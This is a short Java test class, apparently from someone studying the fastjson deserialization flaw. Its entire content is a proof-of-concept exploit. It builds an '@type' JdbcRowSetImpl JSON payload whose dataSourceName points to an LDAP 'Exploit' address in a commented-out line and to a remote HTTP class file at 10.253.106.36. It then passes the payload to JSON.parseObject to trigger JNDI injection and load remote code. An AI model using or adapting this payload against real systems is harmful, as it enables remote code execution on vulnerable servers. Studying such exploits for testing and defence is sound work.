package tmp;

import com.alibaba.fastjson.JSON;

/**
 * @author by Administrator on 2021/7/2.
 */
public class Test {
    public static void main(String[] argv){
        testJdbcRowSetImpl();
    }
    public static void testJdbcRowSetImpl(){
        //        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," +
//                " \"autoCommit\":true}";
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"http://10.253.106.36:8080/ExportObject.class\",\"autoCommit\":true}";
        JSON.parseObject(payload);
    }
}
